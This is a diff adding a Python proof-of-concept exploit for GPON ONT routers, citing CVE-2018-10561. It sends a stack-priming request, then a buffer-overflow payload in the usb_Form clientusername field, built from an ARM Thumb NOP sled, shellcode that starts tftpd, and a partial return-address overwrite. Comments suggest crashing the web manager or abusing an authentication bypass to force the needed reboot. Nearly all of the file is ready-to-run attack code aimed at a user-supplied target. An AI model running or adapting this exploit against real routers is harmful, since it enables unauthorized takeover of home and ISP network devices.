@@ -1,0 +1,147 @@
+#!/usr/bin/python3
+
+
+import argparse
+import requests
+import urllib.parse
+import binascii
+import re
+
+
+def run(target):
+    """ Execute exploitation """
+    # We're using CVE-2018-10561 and/or it's extension in order to exploit this 
+    # Authenticated RCE in usb_Form method of GPON ONT. We can also exploit this 
+    # issue after successful authentication: "useradmin" permission is enough
+    #
+    # IP Spoofing. Perspective option here too
+    #
+
+    # Step 1. Just a request to adjust stack for the exploit to work
+    #
+    # POST /GponForm/device_Form?script/ HTTP/1.1
+    # Host: 192.168.1.1
+    # User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+    # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    # Accept-Language: en-US,en;q=0.5
+    # Accept-Encoding: gzip, deflate
+    # Referer: http://192.168.1.1/device.html
+    # Content-Type: application/x-www-form-urlencoded
+    # Content-Length: 55
+    # Connection: close
+    # Upgrade-Insecure-Requests: 1
+    #
+    # XWebPageName=device&admin_action=usb_enable&usbenable=1
+
+    headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate',
+            'Referer':'http://192.168.1.1/device.html', 'Content-Type':'application/x-www-form-urlencoded',
+            'Connection': 'close', 'Upgrade-Insecure-Requests':'1', 'Cookie':'hibext_instdsigdipv2=1; _ga=GA1.1.1081495671.1538484678'}
+    payload = {'XWebPageName':'device', 'admin_action':'usb_enable', 'usbenable':1}
+    try:
+      requests.post(urllib.parse.urljoin(target, '/GponForm/device_Form?script/'), data=payload, verify=False, headers=headers, timeout=2)
+    except:
+      pass
+
+    # Step 2. Actual Exploitation
+    #
+    # POST /GponForm/usb_Form?script/ HTTP/1.1
+    # Host: 192.168.1.1
+    # User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+    # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    # Accept-Language: en-US,en;q=0.5
+    # Accept-Encoding: gzip, deflate
+    # Referer: http://192.168.1.1/usb.html
+    # Content-Type: application/x-www-form-urlencoded
+    # Content-Length: 639
+    # Connection: close
+    # Upgrade-Insecure-Requests: 1
+
+    # XWebPageName=usb&ftpenable=0&url=ftp%3A%2F%2F&urlbody=&mode=ftp_anonymous&webdir=&port=21&clientusername=BBBBEBBBBDDDDBBBBBCCCCBBBBAAAABBBBAABBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAABBBBBBEEEBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&clientpassword=&ftpdir=&ftpdirname=undefined&clientaction=download&iptv_wan=2&mvlan=-1
+    
+    # Weaponizing request:
+
+    # mov    r8, r8 ; NOP for ARM Thumb
+
+    nop = "\xc0\x46"
+    
+    # .section .text
+    # .global _start
+    # 
+    # _start:
+    # .code 32
+    # add r3, pc, #1
+    # bx r3
+    # 
+    # ; We've removed prev commands as processor is already in Thumb mode
+    #
+    # .code 16
+    # add   r0, pc, #8
+    # eor   r1, r1, r1
+    # eor   r2, r2, r2
+    # strb  r2, [r0, #10] ; Changing last char of command to \x00 in runtime
+    # mov   r7, #11
+    # svc   #1
+    # .ascii "/bin/tftpdX"  
+
+    shellcode = "\x02\xa0\x49\x40\x52\x40\x82\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x74\x66\x74\x70\x64\x58"
+
+    # Overwritting only 3 bytes in order to get \x00 in 4th
+
+    pc = "\xe1\x8c\x03"
+
+    exploit = "A" + 197 * nop + shellcode + 26*"A" + pc 
+
+    payload = {'XWebPageName':'usb', 'ftpenable':'0', 'url':'ftp%3A%2F%2F', 'urlbody':'', 'mode':'ftp_anonymous', 
+            'webdir':'', 'port':21, 'clientusername':exploit, 'clientpassword':'', 'ftpdir':'', 
+            'ftpdirname':'undefined', 'clientaction':'download', 'iptv_wan':'2', 'mvlan':'-1'}
+    headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate',
+            'Referer':'http://192.168.1.1/usb.html', 'Content-Type':'application/x-www-form-urlencoded',
+            'Connection': 'close', 'Upgrade-Insecure-Requests':'1', 
+            'Cookie':'hibext_instdsigdipv2=1; _ga=GA1.1.1081495671.1538484678'}    
+    # Prevent requests from URL encoding
+    payload_str = "&".join("%s=%s" % (k,v) for k,v in payload.items())
+    try:
+      requests.post(urllib.parse.urljoin(target, '/GponForm/usb_Form?script/'), data=payload_str, headers=headers, verify=False, timeout=2)
+    except:
+      pass
+
+    print("The payload has been sent. Please check UDP 69 port of router for the tftpd service");
+    print("You can use something like: sudo nmap -sU -p 69 192.168.1.1");
+
+
+def main():
+    """ Parse command line arguments and start exploit """
+    
+    #
+    # Exploit should be executed after reboot. You can easily achive this in 3 ways:
+    # 1) Send some request to crash WebMgr (any DoS based on BoF). Router will be rebooted after that
+    # 2) Use CVE-2018-10561 to bypass authentication and trigger reboot from "device.html" page
+    # 3) Repeat this exploit at least twice ;)
+    # any of those will work!
+    #
+    
+    parser = argparse.ArgumentParser(
+            add_help=False,
+            formatter_class=argparse.RawDescriptionHelpFormatter,
+            epilog="Examples: %(prog)s -t http://192.168.1.1/")
+
+    # Adds arguments to help menu
+    parser.add_argument("-h", action="help", help="Print this help message then exit")
+    parser.add_argument("-t", dest="target", required="yes", help="Target URL address like: https://localhost:443/")
+
+    # Assigns the arguments to various variables
+    args = parser.parse_args()
+
+    run(args.target)
+
+
+#
+# Main
+#
+
+if __name__ == "__main__":
+    main()
